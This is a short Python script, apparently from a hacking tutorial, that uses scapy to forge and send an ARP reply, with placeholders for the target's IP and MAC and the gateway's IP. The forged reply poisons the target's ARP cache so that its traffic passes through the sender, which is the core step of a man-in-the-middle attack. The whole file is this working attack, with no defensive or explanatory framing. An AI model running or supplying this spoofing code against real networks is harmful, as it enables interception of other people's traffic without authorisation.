#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue Jan 28 02:14:38 2020
"""

import scapy.all as scapy

# you can get the pdst and hwdst fields from the network scanner, psrc must be equal to the gateway IP address. 
packet = scapy.ARP(op=2, pdst="<target_ip>", hwdst="<target_mac>", psrc="<gw_ip>")
scapy.send(packet)